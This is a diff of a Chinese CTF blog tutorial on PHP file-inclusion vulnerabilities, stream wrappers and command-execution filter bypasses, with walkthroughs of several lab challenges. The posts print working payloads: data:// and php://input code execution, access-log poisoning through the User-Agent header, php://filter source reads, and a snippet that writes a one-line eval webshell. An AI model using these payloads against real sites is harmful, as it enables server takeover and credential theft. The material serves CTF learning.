-<h2 id="主流文件包含php一些函数的含义"><a href="#主流文件包含php一些函数的含义" class="headerlink" title="主流文件包含php一些函数的含义"></a>主流文件包含php一些函数的含义</h2><ol>
-<li>include():执行到include()才会包含文件，找不到文件只会产生警告，还会接着运行后面的脚本</li>
-<li>require():只要程序一直运行就会包含文件，如果找不到包含文件则会产生致命错误，并且脚本运行终止</li>
-<li>include_once()和require_once()：如果文件包含被执行了，就不会执行第二次</li>
-</ol>
-<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
-<li>文件包含是也是一种执行方式，即include和require函数的执行都会执行内部的参数，将内部的参数当作php源码去执行</li>
-</ol>
-<h2 id="本地文件包含：LFI，local-file-inclusion"><a href="#本地文件包含：LFI，local-file-inclusion" class="headerlink" title="本地文件包含：LFI，local file inclusion"></a>本地文件包含：LFI，local file inclusion</h2><ol>
-<li><p>本地文件包含漏洞指的是能打开并且包含本地文件的漏洞，大部分情况下遇到的文件包含漏洞都是LFI</p>
-</li>
-<li><p>首先创建两个文件，1.txt 和 11.php  如下：</p>
-</li>
-</ol>
-<p>  <img src="https://img-blog.csdnimg.cn/2018111011030967.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTMzODI4,size_16,color_FFFFFF,t_70"><br>  <img src="https://img-blog.csdnimg.cn/20181110110324655.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTMzODI4,size_16,color_FFFFFF,t_70"></p>
-<ol start="3">
-<li><p>创建完后并对  11.php 进行访问，并且传入参数：<br><img src="https://img-blog.csdnimg.cn/20181110110423351.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTMzODI4,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20181110110413561.PNG"></p>
-</li>
-<li><p>看吧，成功了，这就是简单的本地文件包含，但如果将1.txt 内的内容换成一句换木马，再用菜刀连接一下，那是不是就可以获取shell了，这里小编就不演示了，留给你们慢慢琢磨。。。。。。</p>
-</li>
-</ol>
-<h2 id="远程文件包含，RFI，remote-file-inclusion"><a href="#远程文件包含，RFI，remote-file-inclusion" class="headerlink" title="远程文件包含，RFI，remote file inclusion"></a>远程文件包含，RFI，remote file inclusion</h2><ol>
-<li>远程文件包含需要对php.ini进行一些配置</li>
-<li>即allow_url_fopen和allow_url_include要为ON，即和伪协议的使用条件相同</li>
-<li>设置成功后记得要保存并且重新启动一下</li>
-<li>好了现在可以开始演示远程包含了，其实和文件包含相差无几，只是把包含的换成外网链接一下就好了<br><img src="https://img-blog.csdnimg.cn/20181110112156499.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTMzODI4,size_16,color_FFFFFF,t_70"></li>
-<li>文件包含原理也就是这么个样子，虽然操作简单，但其实是一个很危险的一个漏洞，除了可以利用他拿到shell</li>
-</ol>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="文件包含漏洞记得使用PHP伪协议"><a href="#文件包含漏洞记得使用PHP伪协议" class="headerlink" title="文件包含漏洞记得使用PHP伪协议"></a>文件包含漏洞记得使用PHP伪协议</h3><ol>
-<li>什么时候使用php伪协议：文件包含</li>
-</ol>
-<h3 id="csdn中的一道例题"><a href="#csdn中的一道例题" class="headerlink" title="csdn中的一道例题"></a>csdn中的一道例题</h3><ol>
-<li><a target="_blank" rel="noopener" href="http://vulnerable/fileincl/example1.php?page=intro.php%EF%BC%88%E8%AF%A5php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABLFI%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">http://vulnerable/fileincl/example1.php?page=intro.php（该php文件包含LFI本地文件上传漏洞</a>)</li>
-<li>但是没有地方可以upload你的webshell后门代码</li>
-<li>LFI只能读取到非php文件的源码，因为php文件会被直接执行，没有办法查看到源码（但是如果可以以base64加密，则可以不去读取php的源码）</li>
-<li>如果你能读取到config.php之类的文件，或许可以拿到数据库账号远程登录数据库入侵进去</li>
-<li>现在的问题是：LFI如何读取到php文件的源码</li>
-<li>演示：如果正常用LFI去读/sqli/db.php文件，是无法读取到它的源码的，只会被当作php文件被执行<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;vulnerable&#x2F;fileincl&#x2F;example1.php?page&#x3D;..&#x2F;sqli&#x2F;db.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="https://img-blog.csdn.net/20180725135532381?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NDE5MDEz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></li>
-<li>使用php://filter/read=convert.base64-encode/resource=可以将指定php文件的源码以base64方式编码并被显示出来</li>
-<li>因为被base64编码过了，所以可以不被执行的情况下显示源码，只不过是被base64编码过的，解码即可<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;vulnerable&#x2F;fileincl&#x2F;example1.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;sqli&#x2F;db.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-<h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723125157.png"></p>
-<ol>
-<li>没有任何过滤，可以直接使用伪代码去看看flag.php</li>
-<li>使用php://filter伪代码</li>
-</ol>
-<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><ol>
-<li>发现对php有过滤，使用str_replace进行替换<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723135932.png"></li>
-<li>使用php://filter伪协议查看flag.php的代码发现flag.php被替换为flag.???,被过滤并且不能查看到源代码<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723140046.png"></li>
-<li>伪协议又不止一个，可以使用data://text/plain,伪协议绕过</li>
-<li>因为过滤了’php’字样，所以使用短标签<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; eval($_POST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>使用data://text/plain伪协议的同时，post值<pre class="line-numbers language-none"><code class="language-none">1&#x3D;system(&quot;tac flag.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>即可查看到flag</li>
-<li>这个题的思路和逃逸很类似，将变量1逃逸出去，和命令执行中?c=include%0a$_GET[1]?&gt;&amp;1=system(‘ls’);一样</li>
-</ol>
-<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><h4 id="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"><a href="#日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限" class="headerlink" title="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"></a>日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限</h4><ol>
-<li>nginx日志文件路径：?file=/var/log/nginx/access.log</li>
-<li>apache2日志文件路径:?file=/var/log/apache2/access.log</li>
-<li>直接访问会显示User-Agent的信息<br><img src="https://img-blog.csdnimg.cn/20210227204642790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MDg2MjE4,size_16,color_FFFFFF,t_70"></li>
-<li>写入php文件，进行getshell<br>User-Agent:<?php system("cat flag.php");?></li>
-<li>注意：访问日志文件只会显示前几次的访问情况，要查看当前访问情况需要再一次访问（访问的这一次还没有写入日志中，日志中只有此次访问之前的日志信息）</li>
-</ol>
-<h4 id="题"><a href="#题" class="headerlink" title="题"></a>题</h4><ol>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723145912.png"></li>
-<li>对php和data有过滤，就不能使用php://filter和data://text/plain,伪协议了</li>
-<li>注意是先传User-Agent,到index.php中</li>
-<li>再去访问 ?file=/var/log/nginx/access.log 看看是否包含成功<pre class="line-numbers language-none"><code class="language-none">User-Agent:&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>因为是加的http header，所以原题对传入的file值不会产生过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220728151332.png"></li>
-<li>User-Agent中写post传参，传入一个变量，将变量的值设为木马，和逃逸很相似<pre class="line-numbers language-none"><code class="language-none">User-Agent:&lt;?php eval($_POST[1]);?&gt;
-1&#x3D;system(&quot;ls .&#x2F;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-</ol>
-<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><ol>
-<li>  和上一个题一样，先把User-Agent写进根目录，User-Agent中的内容是php攻击payload</li>
-<li>  拼接get传参的file变量，file=/var/log/nginx/access.log</li>
-<li>  同时post传入攻击payload，和第一步配合</li>
-</ol>
-<h2 id="NewStarCTF-web2-includeOne"><a href="#NewStarCTF-web2-includeOne" class="headerlink" title="NewStarCTF web2 includeOne"></a>NewStarCTF web2 includeOne</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"seed.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//mt_srand(*********);</span>
-<span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hint: "</span><span class="token operator">.</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/base|\.\./i"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/NewStar/i"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token comment">//flag in `flag.php`</span>
-        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Baby Hacker?"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"No Hacker!"</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span> Hint<span class="token punctuation">:</span> <span class="token number">1219893521</span>
-No Hacker<span class="token operator">!</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+日志文件相关日志文件路径
+nginx日志文件路径：?file=/var/log/nginx/access.log
+apache2日志文件路径:?file=/var/log/apache2/access.log
+这里主要看access.log这个日志，这个日志记录着服务器所有的访问记录，包括一些攻击流量
 
-<ol>
-<li><p>  这个题的考点就是mt_rand()函数</p>
-</li>
-<li><p>  这题是伪随机数的种子爆破，跟枯燥的抽奖那题类似，就是mt_rand()生成随机整数的时，会先进行种子的播种，当种子一样，接下来的数值根据次数也是可预测的，题目过滤了base，并且要有NewStar，可以使用rot进行文件包含。</p>
-</li>
-<li><p>  mt_rand()函数每使用一次，就会对当前的seed进行播种，然后伪随机数加密,<strong>但是一定要看好是给出的结果是第几次加密得到的</strong></p>
-</li>
-</ol>
-<h4 id="mt-rand-函数实例"><a href="#mt-rand-函数实例" class="headerlink" title="mt_rand()函数实例"></a>mt_rand()函数实例</h4><ol>
-<li><p>  <img src="https://img-blog.csdnimg.cn/7ea36b40cf8c442c9117260a391230c5.png" alt="img"></p>
-</li>
-<li><p>  <img src="https://img-blog.csdnimg.cn/18f1fe0c9c32495e93179e99cf11e93c.png" alt="img"></p>
-</li>
-<li><p>  爆出了种子为1145146，接下来使用相同的种子进行两次mt_rand()即可得到相同的数值，得到1202031004</p>
-</li>
-<li><p>  <img src="https://img-blog.csdnimg.cn/7049f562ab34453e8173b0f06d819bf0.png" alt="img"></p>
-</li>
-<li><p>  <img src="https://img-blog.csdnimg.cn/7049f562ab34453e8173b0f06d819bf0.png" alt="img"></p>
-</li>
-<li><p>最后进行rot13解密即可</p>
-  <pre class="line-numbers language-php" data-language="php"><code class="language-php">s <span class="token operator">=</span> <span class="token string double-quoted-string">"synt&#123;sor00r4p-63rq-47q0-o8rr-610s58s76n4n&#125;"</span>
+没有acces ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含漏洞">文件包含漏洞</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-07-23T04:17:17.900Z" title="发表于 2022-07-23 12:17:17">2022-07-23</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">文件包含漏洞文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞概念
+php文件包含漏洞产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了意想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入，最常见的就是本地文件包含漏洞
+开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。
+程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。
+在PHP web application中文件包含漏洞居多，jsp，asp等程序中很少，这就是语言设计的弊端
 
-i <span class="token operator">=</span> <span class="token number">13</span>
-result <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>
-<span class="token keyword">for</span> c in s<span class="token punctuation">:</span>
-    oc <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
-    <span class="token keyword">if</span> <span class="token number">65</span> <span class="token operator">&lt;=</span> oc <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">:</span>
-        result <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>oc <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span>
-    elif <span class="token number">97</span> <span class="token operator">&lt;=</span> oc <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">:</span>
-        result <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>oc <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span>
-    <span class="token keyword">else</span><span class="token punctuation">:</span>
-        result <span class="token operator">+=</span> c
-<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
-<span class="token comment">//这时我贴的脚本，我建议使用cyberchef和CTF在线工具等</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h4 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h4><ol>
-<li>  rot13是一种字符处理方式，字符右移13位</li>
-<li>  当preg_match过滤了base时，可以在使用php://filter伪协议的同时使用rot13,而不是使用base64</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006202922.png"></li>
-<li>  在 <strong>filter/</strong> 和 <strong>/read</strong> 之间，我们可以添加任意的字符，当preg_match需要的时候</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006203159.png"></li>
-<li>  查看源代码，我们可以看到rot13编码得到的flag</li>
-<li>  使用凯撒加密解码的方式，我们可以得到flag</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006203327.png"></li>
-</ol>
+类型
+本地文件包含漏洞：网站服务器本身存在恶意文件，然后利用本地文件包含使用
+远程文件包含漏洞：远程文件包含就是调用其它网站的恶意文件进行打开
 
-        </div>
-    
+文件包含函数
+php：include(),include_once(),fopen(),require(),require_once()
+jsp/servelt:ava.io,fil ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议">php伪协议</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-07-20T08:33:52.218Z" title="发表于 2022-07-20 16:33:52">2022-07-20</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">php伪协议什么是php伪协议
+php伪协议实际上就是支持的协议与封装协议
 
-</div>
-            
-                
-<div class="post">
+大佬的博客https://blog.csdn.net/Jeff_12138/article/details/124815370
+什么时候使用php伪协议文件包含时使用!!!
+例如这个时候：
 
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
-                php伪协议
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-07-20</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
+可能遇见的文件包含函数
+data://协议条件：
+allow_url_fopen:on
+allow_url_include:on
 
-    
-        <div class="content">
-            <h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h2 id="什么是php伪协议"><a href="#什么是php伪协议" class="headerlink" title="什么是php伪协议"></a>什么是php伪协议</h2><ol>
-<li>php伪协议实际上就是支持的协议与封装协议</li>
-</ol>
-<h2 id="大佬的博客"><a href="#大佬的博客" class="headerlink" title="大佬的博客"></a>大佬的博客</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jeff_12138/article/details/124815370">https://blog.csdn.net/Jeff_12138/article/details/124815370</a></p>
-<h2 id="什么时候使用php伪协议"><a href="#什么时候使用php伪协议" class="headerlink" title="什么时候使用php伪协议"></a>什么时候使用php伪协议</h2><h3 id="文件包含时使用"><a href="#文件包含时使用" class="headerlink" title="文件包含时使用!!!"></a>文件包含时使用!!!</h3><ol>
-<li>例如这个时候：<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720163511.png"></li>
-</ol>
-<h3 id="可能遇见的文件包含函数"><a href="#可能遇见的文件包含函数" class="headerlink" title="可能遇见的文件包含函数"></a>可能遇见的文件包含函数</h3><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720163727.png"></p>
-<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h3><ol>
-<li>allow_url_fopen:on<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720160552.png"></li>
-<li>allow_url_include:on<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720161022.png"></li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720161043.png"></li>
-</ol>
-<h3 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h3><pre class="line-numbers language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain,
-data:&#x2F;&#x2F;text&#x2F;plain;base64,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><ol>
-<li>data://text/plain,    可以把后面的伪代码当作代码执行<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo?&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>data://text/plain;base64,<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b   &#x2F;&#x2F;后面这一串就是base64编码后的&lt;?php phpinfo()?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-<h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
-<li>allow_url_fopen和allow_url_include为on和close都可，没有什么严格的条件</li>
-</ol>
-<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ol>
-<li>访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen和allow_url_include的影响</li>
-<li>include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。如果上传一个1.txt，仍然可以当作一个php文件去解析</li>
-</ol>
-<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><ol>
-<li>file:// — 访问本地文件系统</li>
-<li>说明文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径(不以://indows 盘符开头的路径)提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。</li>
-</ol>
-<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><ol>
-<li>allow_url_fopen:off/on</li>
-<li>allow_url_include :仅php://input php://stdin php://memory php://temp 需要on</li>
-</ol>
-<h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><ol>
-<li>php:// 访问各个输入/输出流(I/O streams)，在CTF中经常使用的是php://filter和php://input</li>
-<li>php://filter用于读取源码</li>
-<li>php://input用于执行php代码</li>
-</ol>
-<h3 id="php-filter-参数详解"><a href="#php-filter-参数详解" class="headerlink" title="php://filter 参数详解"></a>php://filter 参数详解</h3><ol>
-<li>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递</li>
-<li>简单点说，路径上写参数，参数加到php://filter的路径后面</li>
-</ol>
-<h3 id="示例，最常用的php-filter伪代码"><a href="#示例，最常用的php-filter伪代码" class="headerlink" title="示例，最常用的php://filter伪代码"></a>示例，最常用的php://filter伪代码</h3><ol>
-<li>php://filter/read=convert.base64-encode/resource=[文件名]//后面的可以省略<a href="%E9%92%88%E5%AF%B9php%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81base64%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81">读取文件源码</a><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>php://input + [POST DATA]执行php代码<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input[POST DATA部分]
-[POST DATA]就是php代码，例如&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li>如果有写入权限，则可以写入一句话木马<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input
-[POST DATA部分]
-&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
-</ol>
 
-        </div>
-    
+用法：data:&#x2F;&#x2F;text&#x2F;plain,
+data:&#x2F;&#x2F;text&#x2F;plain;base64,
+示例：
+data://text/plain,    可以把后面的伪代码当作代码执行http:&#x2F;&#x2F;xxx&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo?&gt;;
+data://text/plain;base64,http:&#x2F;&#x2F;xxx&#x2F;include.php?file&#x3D;da ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行漏洞">命令执行漏洞</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-07-18T14:17:51.158Z" title="发表于 2022-07-18 22:17:51">2022-07-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">命令执行漏洞常用绕过
+绕过php，flag等特殊字符：使用通配符
+绕过system等执行函数：使用反单引号
+过滤了. \ `等函数常用字符,但是没有过滤$和_,使用逃逸，c=eval($_GET[1])
+最nb的是可以使用URL编码进行绕过，因为服务器会自动解一层url编码，所以可以对过滤掉的字符进行一次url编码
+过滤了分号，最后一条语句可以不带分号，结束的标志为’?&gt;’,则我们可以将两条语句中间需要分号的位置替换为’?&gt;’,那么就可以使用两条语句
+过滤了分号和括号，则必须使用语言结构，echo print isset unset include require，使用include加上php过滤器实现
+文件包含题目：使用伪协议：data伪协议可以执行后面的php代码
+过滤掉了字符和数字：使用url编码去代替字符，如果可以使用或运算，即可通过或运算去取字符，web41
+如果是过滤掉了冒号，则是想要过滤掉使用伪协议的方法，那么我们可以先逃逸出去一个变量后再使用伪协议进行文件包含操作
